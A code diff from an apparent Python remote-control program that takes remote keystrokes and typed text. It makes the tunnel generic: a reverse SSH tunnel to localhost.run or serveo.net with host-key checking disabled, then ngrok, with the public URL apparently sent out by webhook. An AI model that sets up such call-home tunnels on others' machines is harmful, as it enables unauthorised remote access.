@@ -410,35 +410,36 @@ def on_remote_key(d): remote_key(d["key"])
 def on_remote_type(d): remote_type(d["text"])
 
 # ===== TUNNEL =====
-def tunnel_serveo():
+def tunnel_ssh(domain):
     global tunnel_url, tunnel_urls
-    print("[*] Tentative serveo.net...")
+    tunnel_url = None
+    print(f"[*] Tentative {domain}...")
     cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=30", "-o", "ConnectTimeout=10",
-           "-R", "80:localhost:5000", "serveo.net"]
+           "-R", "80:localhost:5000", domain]
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+        found = threading.Event()
         def reader():
-            global tunnel_url, tunnel_urls
             for line in iter(proc.stdout.readline, ""):
                 line = line.strip()
-                if line: print("[serveo]", line)
-                for m in re.finditer(r'(https?://)?[a-z0-9-]+\.serveo\.net', line):
+                if line: print(f"[{domain}]", line)
+                for m in re.finditer(rf'(https?://)?[a-z0-9-]+\.{domain.replace(".", "\\.")}', line):
                     u = m.group()
                     if not u.startswith("http"): u = "https://" + u
                     if u not in tunnel_urls: tunnel_urls.append(u)
-                    if "console.serveo.net" not in u and not tunnel_url:
+                    if not tunnel_url:
+                        if domain == "serveo.net" and "console." in u: continue
                         tunnel_url = u
-                        print(f"[+] Serveo URL: {tunnel_url}")
+                        print(f"[+] {domain} URL: {tunnel_url}")
+                        found.set()
                         return
         t = threading.Thread(target=reader, daemon=True)
         t.start()
-        for _ in range(30):
-            if tunnel_url: break
-            time.sleep(0.5)
+        found.wait(timeout=15)
         return tunnel_url
     except Exception as e:
-        print(f"[-] serveo error: {e}")
+        print(f"[-] {domain} error: {e}")
         return None
 
 def tunnel_ngrok():
@@ -457,8 +458,9 @@ def tunnel_ngrok():
 def start_tunnel():
     global tunnel_url, tunnel_urls
     tunnel_urls = []
-    tunnel_url = tunnel_serveo()
-    if tunnel_url: return tunnel_url
+    for domain in ["localhost.run", "serveo.net"]:
+        tunnel_url = tunnel_ssh(domain)
+        if tunnel_url: return tunnel_url
     return tunnel_ngrok()
 
 def send_webhook(url, extra_urls=None):
